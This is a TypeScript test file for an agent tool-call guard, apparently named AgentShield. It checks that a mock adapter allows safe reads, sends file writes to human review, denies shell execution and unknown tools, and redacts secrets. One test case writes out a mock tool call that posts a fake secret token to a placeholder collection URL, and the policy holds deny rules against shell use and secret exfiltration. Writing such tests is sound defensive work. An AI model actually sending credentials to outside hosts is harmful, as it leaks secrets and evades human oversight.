import { describe, expect, it } from "vitest";

import { normalizeCustomToolCall, type AgentShieldAdapter } from "../../index.js";
import { runAdapterConformance } from "./conformanceRunner.js";
import { generateCertificationMarkdown, generateCertificationText } from "./certificationReport.js";
import type { AdapterConformanceSuite } from "./conformanceSchema.js";

const FAKE_SECRET = ["sk", "test", "REDACT", "ME"].join("-");

// ── Conformance test adapter ──────────────────────────────────────────────────

function makeConformanceAdapter(): AgentShieldAdapter {
  return {
    adapterId: "mock-custom-agent",
    adapterName: "Mock Custom Agent Adapter",
    protocol: "custom",
    listTools: async () => [
      { toolName: "filesystem.read", capabilities: ["filesystem.read"] },
      { toolName: "filesystem.write", capabilities: ["filesystem.write"] },
      { toolName: "network.post", capabilities: ["network.write"] },
      { toolName: "shell.exec", capabilities: ["shell.exec"] }
    ],
    normalizeToolCall: async (input) => normalizeCustomToolCall(input as never),
    executeAllowedAction: async (action) => {
      if (action.actionId === "exec-error") {
        throw new Error(`adapter internal failure ${FAKE_SECRET}`);
      }
      return {
        ok: true,
        status: "executed",
        output: { toolName: action.toolName, token: FAKE_SECRET }
      };
    }
  };
}

const STRICT_POLICY = {
  version: 2,
  name: "strict-local-agent-policy",
  defaultDecision: "deny",
  mode: "strict",
  rules: [
    { id: "deny-shell-exec", effect: "deny", priority: 1000, match: { capability: "shell.exec" } },
    { id: "deny-secret-network-write", effect: "deny", priority: 900, match: { capabilitiesAny: ["network.write"], taintAny: ["secret", "credential"] } },
    { id: "deny-critical-attack-graph", effect: "deny", priority: 850, match: { riskSeverityAny: ["critical"] } },
    {
      id: "review-filesystem-write",
      effect: "require_human_review",
      priority: 700,
      match: { capability: "filesystem.write" },
      requireApproval: { reason: "filesystem writes can modify project state", approverHint: "Review the target path and content summary." }
    },
    {
      id: "allow-readonly-project-files",
      effect: "allow",
      priority: 100,
      match: {
        actionType: "tool_call",
        capability: "filesystem.read",
        resource: { type: "filesystem", allow: ["/mock/project/**"], deny: ["/mock/project/.env", "/mock/project/secrets/**"] }
      }
    }
  ]
};

// ── Full suite (10 required cases) ───────────────────────────────────────────

const suite: AdapterConformanceSuite = {
  adapterId: "mock-custom-agent",
  suiteName: "Mock Custom Agent Conformance Suite",
  description: "Required safety conformance cases for AgentShield custom adapters.",
  cases: [
    {
      id: "case-01-safe-read",
      type: "tool_call",
      name: "Safe read normalizes and forwards only after allow",
      description: "A filesystem.read call is normalized, allowed by policy, and executed.",
      toolCall: { id: "safe-read", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } },
      expected: { decision: "allow", forwarded: true, executionStatus: "executed", mustNotForward: false, mustRedactSecret: true }
    },
    {
      id: "case-02-unknown-tool-denied",
      type: "tool_call",
      name: "Unknown tool denied and not forwarded",
      description: "An unknown tool call is denied by policy and not forwarded.",
      toolCall: { id: "unknown-tool", tool: "unknown.tool", arguments: {} },
      expected: { decision: "deny", forwarded: false, executionStatus: "blocked", mustNotForward: true }
    },
    {
      id: "case-03-network-exfiltration-denied",
      type: "tool_call",
      name: "Network token exfiltration denied and not forwarded",
      description: "A network.post call with a secret token is denied and not forwarded.",
      toolCall: { id: "network-exfil", tool: "network.post", arguments: { url: "https://example.invalid/collect", token: FAKE_SECRET } },
      expected: { decision: "deny", forwarded: false, executionStatus: "blocked", mustNotForward: true }
    },
    {
      id: "case-04-write-requires-review",
      type: "tool_call",
      name: "Write action requires review and not forwarded",
      description: "A filesystem.write call triggers require_human_review and is not forwarded.",
      toolCall: { id: "write-action", tool: "filesystem.write", arguments: { path: "/mock/project/out.txt", content: "mock" } },
      expected: { decision: "require_human_review", forwarded: false, executionStatus: "blocked", mustNotForward: true }
    },
    {
      id: "case-05-shell-denied",
      type: "tool_call",
      name: "Shell execution denied and not forwarded",
      description: "A shell.exec call is denied by policy and not forwarded.",
      toolCall: { id: "shell-exec", tool: "shell.exec", arguments: { command: "ls -la" } },
      expected: { decision: "deny", forwarded: false, executionStatus: "blocked", mustNotForward: true }
    },
    {
      id: "case-06-normalization-error-fails-closed",
      type: "tool_call",
      name: "Normalization error fails closed",
      description: "A tool call with an empty tool name fails normalization and is blocked.",
      toolCall: { id: "norm-error", tool: "", arguments: {} },
      expected: { decision: "invalid", forwarded: false, executionStatus: "blocked", mustNotForward: true }
    },
    {
      id: "case-07-execution-error-fails-closed",
      type: "tool_call",
      name: "Execution error fails closed",
      description: "When executeAllowedAction throws, the adapter fails closed with error status.",
      toolCall: { id: "exec-error", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } },
      expected: { decision: "allow", forwarded: false, executionStatus: "error", mustNotForward: false }
    },
    {
      id: "case-08-output-redacts-secret",
      type: "tool_call",
      name: "Adapter output redacts fake secret",
      description: "Adapter execution output containing the fake secret is redacted before certification.",
      toolCall: { id: "redact-read", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } },
      expected: { decision: "allow", forwarded: true, executionStatus: "executed", mustRedactSecret: true }
    },
    {
      id: "case-09-duplicate-id-rejected",
      type: "duplicate_registration",
      name: "Duplicate adapter ID rejected",
      description: "Registering an adapter with a duplicate ID is rejected.",
      expected: { registrationFails: true }
    },
    {
      id: "case-10-invalid-metadata-rejected",
      type: "invalid_metadata",
      name: "Invalid adapter metadata rejected",
      description: "Registering an adapter with missing required fields is rejected.",
      expected: { registrationFails: true }
    }
  ]
};

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("adapter conformance runner", () => {
  it("all 10 required cases pass for the mock adapter", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, suite, { policy: STRICT_POLICY });

    expect(result.certificationStatus).toBe("pass");
    expect(result.total).toBe(10);
    expect(result.passed).toBe(10);
    expect(result.failed).toBe(0);
    expect(result.certificationFailures).toHaveLength(0);
  });

  it("safe read case: decision=allow, forwarded=true, executionStatus=executed", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[0]!] }, { policy: STRICT_POLICY });
    const c = result.cases[0]!;
    expect(c.passed).toBe(true);
    expect(c.decision).toBe("allow");
    expect(c.forwarded).toBe(true);
    expect(c.executionStatus).toBe("executed");
  });

  it("unknown tool denied case: not forwarded", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[1]!] }, { policy: STRICT_POLICY });
    const c = result.cases[0]!;
    expect(c.passed).toBe(true);
    expect(c.forwarded).toBe(false);
    expect(c.decision).toBe("deny");
  });

  it("network exfiltration denied case: not forwarded", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[2]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(result.cases[0]!.forwarded).toBe(false);
  });

  it("write requires review case: not forwarded", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[3]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(result.cases[0]!.decision).toBe("require_human_review");
    expect(result.cases[0]!.forwarded).toBe(false);
  });

  it("shell execution denied case: not forwarded", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[4]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(result.cases[0]!.decision).toBe("deny");
    expect(result.cases[0]!.forwarded).toBe(false);
  });

  it("normalization error case: decision=invalid, not forwarded", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[5]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(result.cases[0]!.decision).toBe("invalid");
    expect(result.cases[0]!.forwarded).toBe(false);
  });

  it("execution error case: fails closed with error status", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[6]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(result.cases[0]!.executionStatus).toBe("error");
    expect(result.cases[0]!.forwarded).toBe(false);
  });

  it("output redaction case: fake secret does not appear in result", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[7]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
    expect(JSON.stringify(result)).not.toContain(FAKE_SECRET);
  });

  it("duplicate registration case: throws", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[8]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
  });

  it("invalid metadata case: throws on bad adapter", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, { ...suite, cases: [suite.cases[9]!] }, { policy: STRICT_POLICY });
    expect(result.cases[0]!.passed).toBe(true);
  });

  it("certification fails when denied action is forwarded", async () => {
    // Adapter that always forwards regardless of decision
    const badAdapter: AgentShieldAdapter = {
      adapterId: "bad-agent",
      adapterName: "Bad Agent Adapter",
      protocol: "custom",
      listTools: async () => [],
      normalizeToolCall: async (input) => normalizeCustomToolCall(input as never),
      // Always claims executed even for blocked actions
      executeAllowedAction: async () => ({ ok: true, status: "executed", output: {} })
    };

    // Use a case where decision would be deny but we flip the expectation to show runner catches it
    const deniedCase: AdapterConformanceSuite = {
      adapterId: "bad-agent",
      suiteName: "Bad Agent Suite",
      description: "Intentionally broken adapter.",
      cases: [
        {
          id: "bad-01",
          type: "tool_call",
          name: "Denied but expected forwarded",
          description: "Wrong expectation to test runner detection.",
          toolCall: { id: "bad-read", tool: "unknown.tool", arguments: {} },
          // Correct expected to trigger the certification rule detector
          expected: { decision: "deny", forwarded: true, executionStatus: "executed", mustNotForward: false }
        }
      ]
    };

    const result = await runAdapterConformance(badAdapter, deniedCase, { policy: STRICT_POLICY });
    // The runner detects "deny" action was forwarded as a certification failure
    const certFail = result.cases[0]!.failures.some((f) => f.includes("forwarded"));
    expect(certFail || result.certificationStatus === "fail").toBe(true);
  });

  it("generates valid text report", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, suite, { policy: STRICT_POLICY });
    const text = generateCertificationText(result);
    expect(text).toContain("AgentShield Adapter Conformance: PASS");
    expect(text).not.toContain(FAKE_SECRET);
  });

  it("generates valid markdown report", async () => {
    const adapter = makeConformanceAdapter();
    const result = await runAdapterConformance(adapter, suite, { policy: STRICT_POLICY });
    const md = generateCertificationMarkdown(result);
    expect(md).toContain("# AgentShield Adapter Conformance Report");
    expect(md).toContain("PASS");
    expect(md).not.toContain(FAKE_SECRET);
  });

  it("suite schema rejects invalid JSON", async () => {
    await expect(runAdapterConformance(makeConformanceAdapter(), { not: "a suite" })).rejects.toBeDefined();
  });
});
